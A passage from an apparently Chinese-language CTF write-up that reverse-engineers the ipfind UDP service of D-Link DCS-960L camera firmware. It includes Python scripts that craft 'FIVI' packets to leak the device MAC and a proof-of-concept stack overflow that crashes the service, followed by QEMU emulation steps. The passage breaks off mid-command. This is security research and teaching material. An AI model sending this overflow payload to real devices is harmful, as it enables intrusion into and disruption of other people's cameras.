&amp;&amp; user_data[<span class="number">8</span>] == <span class="number">10</span> )</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span> ( v7 == <span class="number">1</span> )</span><br><span class="line">                {</span><br><span class="line">                  <span class="keyword">if</span> ( !v8 &amp;&amp; !<span class="built_in">memcmp</span>(v21, v23, <span class="number">6u</span>) &amp;&amp; !v17 )</span><br><span class="line">                    sub_40172C(user_data);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">2</span></span><br><span class="line">                       &amp;&amp; net_get_hwaddr(ifname, v22) &gt;= <span class="number">0</span></span><br><span class="line">                       &amp;&amp; !<span class="built_in">memcmp</span>(v21, v22, <span class="number">6u</span>)</span><br><span class="line">                       &amp;&amp; *&amp;user_data[<span class="number">25</span>] == <span class="number">142</span> )</span><br><span class="line">                {</span><br><span class="line">                  sub_4013F4(user_data, <span class="number">142</span>);</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br></pre></td></tr></tbody></table></figure><p><code>recvfrom(server_sockfd, user_data, 0x800u, 0, &amp;client_addr, addr_len);</code></p><ul><li>最大接收0x800个数据到user_data中</li></ul><p>如果满足一些条件，会进入<code>sub_40172C</code>函数和<code>sub_40172C</code>函数</p><ul><li><p><code>!strncmp(v18, v20, 4u)</code></p><ul><li>v18和v20要相等，v20是<code>FIVI</code>，v18是<code>user_data</code>起始的数据，所以第一步<code>user_data = 'FIVI'</code></li></ul></li><li><p><code>user_data[8] == 10</code></p><ul><li>第9个数要为<code>'\n'</code>，所以<code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n'</code></li></ul></li><li><p><code>v7 == 1</code></p><ul><li><code>((_byteswap_ushort(*&amp;user_data[9]) &lt;&lt; 8) | ((user_data[10] | (user_data[9] &lt;&lt; 8)) &gt;&gt; 8)) == 1</code></li><li>当user_data[9] = 0x1，user_data[10] = 0的时候满足这个条件</li><li>也就是<code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00'</code></li></ul></li><li><p><code>!memcmp(v21, v23, 6u)</code></p><ul><li>v21和v23要相等，v23是<code>0xff * 6</code>，这里其实就是mac_addr</li><li><code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6</code></li></ul></li><li><p>!v8</p><ul><li>v8要为0，<code>v8 = ((_byteswap_ushort(*&amp;user_data[23]) &lt;&lt; 8) | ((user_data[24] | (user_data[23] &lt;&lt; 8)) &gt;&gt; 8))</code></li><li>23和24都为0的时候v8就为0</li><li><code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6 + '\x00\x00'</code></li></ul></li><li><p>!v17</p><ul><li>v17要为0，<code>v17 = (*&amp;user_data[25] &lt;&lt; 24) | user_data[25] | ((*&amp;user_data[25] &amp; 0xFF0000u) &gt;&gt; 8) | ((*&amp;user_data[25] &amp; 0xFF00) &lt;&lt; 8)</code></li><li>当25为0就可以满足条件</li><li><code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6 + '\x00\x00' + '\x00'</code></li></ul></li></ul><p>所以进入<code>sub_40172C</code>函数的开头是</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p1 = b<span class="number">'F</span>IVI<span class="number">'</span></span><br><span class="line">p1 += b<span class="number">'</span>\x00\x00\x00\x00<span class="number">'</span></span><br><span class="line">p1 += b<span class="number">'</span>\n<span class="number">'</span></span><br><span class="line">p1 += b<span class="number">'</span>\x01\x00<span class="number">'</span></span><br><span class="line">p1 += b<span class="number">'</span>\x00\x00\x00\x00\x00\x00<span class="number">'</span></span><br><span class="line">p1 += b<span class="number">'</span>\xff<span class="number">'</span> * <span class="number">6</span></span><br><span class="line">p1 += b<span class="number">'</span>\x00\x00<span class="number">'</span></span><br><span class="line">p1 += b<span class="number">'</span>\x00<span class="number">'</span></span><br></pre></td></tr></tbody></table></figure><p>现在写一个连接脚本，并发送p1</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'mips'</span>, endian=<span class="string">'big'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'192.168.10.200'</span></span><br><span class="line">port = <span class="number">62720</span></span><br><span class="line"></span><br><span class="line">r = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">lg(<span class="string">'[+] open connection'</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'FIVI'</span></span><br><span class="line">p1 += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\n'</span></span><br><span class="line">p1 += <span class="string">b'\x01\x00'</span></span><br><span class="line">p1 += <span class="string">b'\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\xff'</span> * <span class="number">6</span></span><br><span class="line">p1 += <span class="string">b'\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line">r.sendto(p1, (ip, port))</span><br><span class="line"></span><br><span class="line">recv_data, recv_addr = r.recvfrom(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">li(recv_data)</span><br></pre></td></tr></tbody></table></figure><p>最后可以接收到<code>sub_40172C</code>返回的东西</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/i/rwctf_2023&gt; python3 exp.py</span><br><span class="line">[+] open connection</span><br><span class="line">b<span class="string">'FIVI\x00\x00\x00\x01\x0b\x01\x00\x00\x00\xc0\xa8\n\xc8\x00\x16&gt;\x00\x00\x01\x00\x00\x00\x02\x00\x00D-Link\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00DCS-960L\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00DCS-960L\x00\x00\x00\x00\x00\x00\x00\x001.9.0\x00\x00\x00\x01\x00\x01\x00\x00\x00DCS-960L\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00\xc0\xa8\x00\x01\xc0\xa8\x00\x01\x00\x00\x00\x00P\x00*\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></span><br></pre></td></tr></tbody></table></figure><h3 id="sub-40172C"><a href="#sub-40172C" class="headerlink" title="sub_40172C"></a>sub_40172C</h3><p>这个函数会获取设备的基本信息，其中里面最重要的是mac地址，因为mac地址关乎着漏洞触发点的发生</p><p>看一下<code>sub_400E50</code>这个函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_400E50</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+18h] [-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *a1 = *<span class="string">"FIVI"</span>;</span><br><span class="line">  *(a1 + <span class="number">4</span>) = <span class="number">0x1000000</span>;</span><br><span class="line">  *(a1 + <span class="number">8</span>) = <span class="number">0xB</span>;</span><br><span class="line">  v3 = *(a2 + <span class="number">10</span>) | (*(a2 + <span class="number">9</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  *(a1 + <span class="number">9</span>) = _byteswap_ushort(*(a2 + <span class="number">9</span>));</span><br><span class="line">  v4 = *(a2 + <span class="number">12</span>) | (*(a2 + <span class="number">11</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  *(a1 + <span class="number">11</span>) = _byteswap_ushort(*(a2 + <span class="number">11</span>));</span><br><span class="line">  *(a1 + <span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line">  *(a1 + <span class="number">9</span>) = (v3 &gt;&gt; <span class="number">8</span>) | (v3 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  *(a1 + <span class="number">11</span>) = (v4 &gt;&gt; <span class="number">8</span>) | (v4 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( net_get_ifaddr(ifname, &amp;v6) &gt;= <span class="number">0</span> )</span><br><span class="line">    *(a1 + <span class="number">13</span>) = v6;</span><br><span class="line">  <span class="keyword">return</span> net_get_hwaddr(ifname, a1 + <span class="number">17</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里会调用<code>net_get_hwaddr</code>得到设备的mac地址，并会存在<code>17 - 17 + 6</code>这里</p><p>所以继续写一下脚本来得到mac地址</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getmac</span>(<span class="params">mac_addr</span>):</span><br><span class="line">    hex_str = binascii.hexlify(mac_addr).decode()</span><br><span class="line">    mac_addr = <span class="string">':'</span>.join([hex_str[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>)])</span><br><span class="line">    li(<span class="string">'[+] mac = '</span> + <span class="built_in">str</span>(mac_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(recv_data) == <span class="number">0x21d</span>):</span><br><span class="line">    mac_addr = recv_data[<span class="number">0x11</span>:<span class="number">0x17</span>]</span><br><span class="line">    getmac(mac_addr)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ll(<span class="string">"[-] recv error"</span>)</span><br></pre></td></tr></tbody></table></figure><p>结果如下</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/i/rwctf_2023&gt; python3 exp.py</span><br><span class="line">[+] open connection</span><br><span class="line">[+] mac = 00:16:3e:00:00:01</span><br></pre></td></tr></tbody></table></figure><h3 id="sub-4013F4"><a href="#sub-4013F4" class="headerlink" title="sub_4013F4"></a>sub_4013F4</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">2</span></span><br><span class="line">                               &amp;&amp; net_get_hwaddr(ifname, v22) &gt;= <span class="number">0</span></span><br><span class="line">                               &amp;&amp; !<span class="built_in">memcmp</span>(v21, v22, <span class="number">6u</span>)</span><br><span class="line">                               &amp;&amp; *&amp;user_data[<span class="number">25</span>] == <span class="string">'\x8E'</span> )</span><br><span class="line">                        {</span><br><span class="line">                          (sub_4013F4)(user_data, <span class="string">'\x8E'</span>);</span><br></pre></td></tr></tbody></table></figure><ul><li>回到主函数，继续往下看，首先v7变成2了<ul><li>也就是<code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x02\x00'</code></li></ul></li><li><code>net_get_hwaddr(ifname, v22) &gt;= 0</code><ul><li>这里就是mac地址放入了v22</li></ul></li><li><code>!memcmp(v21, v22, 6u)</code><ul><li>这里就是v21需要和v22相等</li><li>也就是<code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + mac</code></li></ul></li><li><code>*&amp;user_data[25] == '\x8E'</code><ul><li>也就是<code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6 + '\x00\x00' + '\x8E'</code></li></ul></li></ul><p>所以逆出进入4013F4的格式是</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="string">b'FIVI'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\n'</span></span><br><span class="line">p2 += <span class="string">b'\x02\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">p2 += mac</span><br><span class="line">p2 += <span class="string">b'\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x8E'</span></span><br></pre></td></tr></tbody></table></figure><p>接着进入4013F4函数，漏洞点发生在<code>400f50</code>这个函数里</p><h3 id="sub-400F50"><a href="#sub-400F50" class="headerlink" title="sub_400F50"></a>sub_400F50</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !sub_400F50(a1 + <span class="number">0x1D</span>, a1 + <span class="number">0x5D</span>) )</span><br></pre></td></tr></tbody></table></figure><p>a1就是上面的p2</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_400F50</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> Group; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> Pass; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">256</span>]; <span class="comment">// [sp+18h] [-344h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">256</span>]; <span class="comment">// [sp+118h] [-244h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">256</span>]; <span class="comment">// [sp+218h] [-144h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">68</span>]; <span class="comment">// [sp+318h] [-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">  Base64decs(a1, v6);</span><br><span class="line">  Base64decs(a2, v7);</span><br><span class="line">  cfgRead(<span class="string">"USER_ADMIN"</span>, <span class="string">"Username1"</span>, v9);</span><br><span class="line">  usrInit(<span class="number">0</span>);</span><br><span class="line">  Group = usrGetGroup(v6);</span><br><span class="line">  Pass = usrGetPass(v6, v8, <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Pass == <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( !Group &amp;&amp; !<span class="built_in">strcmp</span>(v9, v6) )</span><br><span class="line">      Pass = <span class="built_in">strcmp</span>(v7, v8) != <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    Pass = <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  usrFree();</span><br><span class="line">  <span class="keyword">return</span> Pass;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在第二个<code>Base64decs(a2, v7);</code>中，会对a2进行base64解码，然后将解码之后的数据存到v7中，a2 = p2 + 0x5d，也就是0x5d后面的数据会进行base64decode到v7中，p2可控，这就造成了栈溢出漏洞</p><p>所以给出如下poc即可验证</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="string">b'FIVI'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\n'</span></span><br><span class="line">p2 += <span class="string">b'\x02\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">p2 += mac_addr</span><br><span class="line">p2 += <span class="string">b'\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x8E'</span></span><br><span class="line">p2 = p2.ljust(<span class="number">0x5d</span>, <span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'a'</span> * <span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">p2 += base64.b64encode(p3)</span><br><span class="line">li(p2)</span><br><span class="line"></span><br><span class="line">r.sendto(p2, (ip, port))</span><br></pre></td></tr></tbody></table></figure><p>p3这里就是a2，运行之后就能看到ipfind程序崩溃</p><h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>没有真机，这里用固件模拟</p><p>首先准备一个bash启动脚本，里面要包含需要的东西，<code>vmlinux-3.2.0-4-4kc-malta</code>，<code>debian_wheezy_mips_standard.qcow2</code></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig ens32 down</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 ens32</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up</span><br><span class="line">sudo ifconfig ens32 0.0.0.0 promisc up</span><br><span class="line">sudo dhclient br0</span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo brctl addif br0 tap0</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up</span><br><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_wheezy_mips_standard.qcow2 \</span><br><span class="line">    -append <span class="string">"root=/dev/sda1 console=tty0"</span> \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></tbody></table></figure><p>然后还要准备一个完整的busybox和一个gdbserver，启动脚本，默认账号密码是root:root</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~<span class="comment"># ifconfig</span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:16:3e:00:00:01</span><br><span class="line">          inet6 addr: fe80::216:3eff:fe00:1/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:14 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:12 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:840 (840.0 B)  TX bytes:2288 (2.2 KiB)</span><br><span class="line">          Interrupt:10 Base address:0x1020</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback</span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></tbody></table></figure><p>进去之后却发现eth0没有正常运行，所以我们给他加上一个ip</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~<span class="comment"># ifconfig eth0 192.168.10.200/24 up</span></span><br></pre></td></tr></tbody></table></figure><p>此时可以看到eth0正常</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~<span class="comment"># ifconfig</span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:16:3E:00:00:01</span><br><span class="line">          inet addr:192.168.10.200  Bcast:192.168.10.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::216:3eff:fe00:1/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1028 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:219 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:1104487 (1.0 MiB)  TX bytes:26470 (25.8 KiB)</span><br><span class="line">          Interrupt:10 Base address:0x1020</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback</span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:3 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:3 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:276 (276.0 B)  TX bytes:276 (276.0 B)</span><br></pre></td></tr></tbody></table></figure><p>接下来就要真正的启动固件啦</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev</span><br><span class="line"><span class="built_in">chroot</span> ./squashfs-root/ sh</span><br></pre></td></tr></tbody></table></figure><p>然后用上面的命令把固件作为主体，进行相应的挂载操作，然后启动sh，此时成功模拟出了一个固件</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~<span class="comment"># chroot ./squashfs-root/ sh</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">bin                                  root</span><br><span class="line">busybox-mips                         sbin</span><br><span class="line">dev                                  server</span><br><span class="line">etc                                  share</span><br><span class="line">gdbserver-7.7.1-mips-mips-i-v1-sysv  sys</span><br><span class="line">home                                 tmp</span><br><span class="line">lib                                  usr</span><br><span class="line">mnt                                  var</span><br><span class="line">mydlink                              web</span><br><span class="line">proc</span><br></pre></td></tr></tbody></table></figure><p>但是里面的服务还没有真正的启动，所以执行一下固件里的启动脚本</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 